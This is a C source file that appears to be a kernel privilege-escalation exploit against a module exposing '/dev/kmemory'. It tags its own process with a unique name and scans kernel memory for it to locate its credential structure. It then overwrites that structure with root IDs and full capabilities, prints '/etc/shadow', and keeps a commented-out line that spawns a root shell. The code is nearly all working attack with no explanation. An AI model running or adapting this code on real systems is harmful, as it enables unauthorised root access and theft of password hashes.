#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "kmem_ioctl.h"

#define UBUNTU14_32 1
#define UBUNTU14_64 2

#ifndef SYSTEM
# define SYSTEM UBUNTU14_64
#endif

#if SYSTEM == UBUNTU14_32
# define START_ADDR 0xC0000000
#elif SYSTEM == UBUNTU14_64
# define START_ADDR 0xffff880000000000
#endif

#define PAGE_SIZE 0x1000

static void fatal(char *msg)
{
        fprintf(stderr, "%s\n", msg);
        exit(1);
}

int cat(const char *fname)
{
	char buffer[4096];
	ssize_t nbytes;
	int ifd = open(fname, O_RDONLY);

	if (ifd < 0) {
		fprintf(stderr, "Can't open file %s\n", fname);
		perror("Error: ");
		return -1;
	}

	while ((nbytes = read(ifd, buffer, sizeof(buffer))) > 0) {
		if (write(1, buffer, nbytes) != nbytes)
			return -2;
	}

	return (nbytes < 0) ? -2 : 0;
}

void find_creds(int fd, unsigned long *cred, unsigned long *real_cred, char *buffer, const char *comm)
{
	unsigned long offset = 0;
	unsigned long k_addr = START_ADDR;
	unsigned long *start_buffer;

	while (1) {
		k_addr = START_ADDR + offset;

		if (k_addr < START_ADDR) {
			break;
		}

		struct kmem_ioctl mem = {
                        .rw = {
                                .buf   = buffer,
                                .ppos  = k_addr,
                                .count = PAGE_SIZE
                        }
                };
		if (ioctl(fd, KMEM_IOCTL_READ, &mem) < 0) {
			offset += PAGE_SIZE;
			continue;
		}

		start_buffer = (unsigned long *) buffer;

		start_buffer = memmem(start_buffer, PAGE_SIZE, comm, 15);

		if (start_buffer != NULL) {
			if ((start_buffer[-2] > START_ADDR) && (start_buffer[-1] > START_ADDR)) {
				*real_cred = start_buffer[-2];
				*cred      = start_buffer[-1];

				printf("[+] Found comm signature %s at %p\n", (char *) start_buffer,
				       (unsigned long *) (k_addr + ((char *) start_buffer - buffer)));
				printf("[+] real_cred: %p\n", (void *) *real_cred);
				printf("[+] cred: %p\n",      (void *) *cred);

				break;
			}
		}

		offset += PAGE_SIZE;
	}
}

int main(int argc, char *argv[])
{
	int fd, rc;
	const char *comm = "63cb7feb47b527f";

	fd = open("/dev/kmemory", O_RDONLY);
	if (fd < 0) {
		printf("Can't open /dev/kmemory\n");
		exit(1);
	}
	printf("open: fd %d\n", fd);

	if (prctl(PR_SET_NAME, comm) < 0) {
		fatal("[x] Could not set comm\n");
	}

	unsigned long cred = 0, real_cred = 0;
	char *buffer = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0,0);
        if (!buffer) {
                fatal("[x] Can't allocate memory buffer\n");
        }

	find_creds(fd, &cred, &real_cred, buffer, comm);

	if (cred == 0 && real_cred == 0) {
		fatal("[x] Can't find comm exiting...\n");
	}

	unsigned char root_creds[] = {
		0xff, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00
	};
	struct kmem_ioctl current_cred = { .rw = { .buf = root_creds, .count = sizeof(root_creds), .ppos = cred } };
	rc = ioctl(fd, KMEM_IOCTL_WRITE, &current_cred);

        if (getuid() == 0) {
                printf("[+] Got root!\n");
        } else {
                fatal("[x] Failed to get root :(");
        }

        setresuid(0, 0, 0);
	cat("/etc/shadow");
        //execl("/bin/sh", "/bin/sh", "−i", NULL);
}
